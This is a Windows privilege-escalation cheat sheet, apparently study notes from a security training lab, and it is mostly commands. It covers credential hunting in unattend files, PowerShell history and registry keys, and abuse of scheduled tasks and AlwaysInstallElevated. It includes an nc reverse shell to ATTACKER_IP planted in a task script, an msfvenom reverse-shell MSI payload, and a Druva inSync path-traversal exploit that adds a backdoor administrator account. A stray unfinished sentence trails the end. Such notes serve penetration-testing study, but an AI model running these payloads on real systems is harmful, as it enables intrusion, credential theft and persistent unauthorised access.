
---

# Windows Privilege Escalation

## Goal

Privilege escalation is the process of leveraging an existing low-privileged account to obtain access to a higher privileged account (Administrator or SYSTEM).

Common privilege escalation vectors include:

* Stored credentials
* Misconfigured scheduled tasks
* Misconfigured Windows Installer
* Vulnerable software
* Missing patches
* Weak permissions
* Public exploits

---

# Windows Account Types

## Administrators

* Full system control
* Can modify system configuration
* Access every file

## Standard Users

* Limited privileges
* Usually restricted to personal files

---

## Built-in Accounts

### SYSTEM / LocalSystem

Highest local privilege.

* More privileged than Administrator
* Used internally by Windows

### Local Service

* Minimal privileges
* Anonymous network access

### Network Service

* Minimal privileges
* Authenticates using computer account

---

# Initial Enumeration

Determine:

* Current user

```cmd
whoami
```

Current privileges

```cmd
whoami /priv
```

Current groups

```cmd
whoami /groups
```

System information

```cmd
systeminfo
```

Hostname

```cmd
hostname
```

---

# Credential Hunting

## Unattended Installations

Check:

```
C:\Unattend.xml

C:\Windows\Panther\Unattend.xml

C:\Windows\Panther\Unattend\Unattend.xml

C:\Windows\System32\sysprep.inf

C:\Windows\System32\sysprep\sysprep.xml
```

Possible credentials:

```xml
<Credentials>
<Username>Administrator</Username>
<Password>Password</Password>
</Credentials>
```

---

## PowerShell History

From cmd.exe

```cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

From PowerShell

```powershell
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

Look for:

* passwords
* credentials
* net use
* runas
* scripts

---

## Saved Windows Credentials

List saved credentials

```cmd
cmdkey /list
```

Run as saved credential

```cmd
runas /savecred /user:Administrator cmd.exe
```

---

## IIS Configuration

Possible locations

```
C:\inetpub\wwwroot\web.config

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```

Search connection strings

```cmd
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

Possible findings

* Database passwords
* Service credentials

---

## PuTTY Stored Credentials

Search registry

```cmd
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

Possible findings

* Proxy username
* Proxy password

---

# Scheduled Tasks

List tasks

```cmd
schtasks
```

Detailed task information

```cmd
schtasks /query /tn <taskname> /fo list /v
```

Important fields

```
Task To Run

Run As User
```

Check permissions

```cmd
icacls C:\path\to\binary.bat
```

If writable:

Replace task binary with payload.

Example

```cmd
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```

Start listener

```bash
nc -lvnp 4444
```

Run task

```cmd
schtasks /run /tn vulntask
```

---

# AlwaysInstallElevated

Check registry

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

Both keys must exist.

Generate payload

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o malicious.msi
```

Execute

```cmd
msiexec /quiet /qn /i malicious.msi
```

---

# Installed Software Enumeration

List installed software

```cmd
wmic product get name,version,vendor
```

Research

* Exploit-DB
* Packet Storm
* Google

Search format

```
Software Version exploit

Software Version CVE

Software Version github
```

---

# Case Study — Druva inSync 6.6.3

Vulnerability

RPC service on localhost:6064 running as SYSTEM.

Procedure 5 allows command execution.

Original patch only validated the beginning of the executable path.

Path traversal bypass:

```
C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe
```

Payload used

```cmd
net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add
```

Verification

```cmd
net user pwnd
```

Then launch an Administrator command prompt using the newly created account.

---

# Automated Enumeration

## WinPEAS

Run

```cmd
winpeas.exe > output.txt
```

Enumerates

* Credentials
* Services
* Registry
* Scheduled Tasks
* UAC
* Privileges
* Weak permissions
* Installed software
* Missing patches

---

## PrivescCheck

Bypass execution policy

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
```

Import

```powershell
. .\PrivescCheck.ps1
```

Run

```powershell
Invoke-PrivescCheck
```

---

## WES-NG

Collect

```cmd
systeminfo > systeminfo.txt
```

Update database

```bash
wes.py --update
```

Run

```bash
wes.py systeminfo.txt
```

Finds

* Missing Windows patches
* Known privilege escalation CVEs

---

## Metasploit Local Exploit Suggester

If using Meterpreter

```text
multi/recon/local_exploit_suggester
```

Lists potential local privilege escalation vulnerabilities.

---

# Privilege Escalation Workflow

### 1. Enumerate

* Users
* Groups
* Privileges
* Services
* Scheduled tasks
* Installed software
* Credentials
* Registry
* Patches

---

### 2. Identify

Look for

* Writable binaries
* Stored credentials
* Weak ACLs
* Vulnerable software
* Missing patches
* Misconfigurations

---

### 3. Research

Use

* Google
* Exploit-DB
* GitHub
* CVE references

---

### 4. Exploit

* Modify writable binaries
* Abuse scheduled tasks
* Recover credentials
* Use public exploits
* Execute MSI (AlwaysInstallElevated)
* Exploit vulnerable software

---

### 5. Verify

```cmd
whoami

whoami /groups

whoami /priv
```

Confirm Administrator or SYSTEM access.

---

# Quick Command Reference

```cmd
whoami
whoami /priv
whoami /groups
systeminfo
hostname

cmdkey /list

schtasks
schtasks /query /tn <task> /fo list /v
schtasks /run /tn <task>

icacls <file>

wmic product get name,version,vendor

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

net user
net localgroup administrators

msiexec /quiet /qn /i malicious.msi
```
 organized by enumeration → discovery → exploitation → verification,
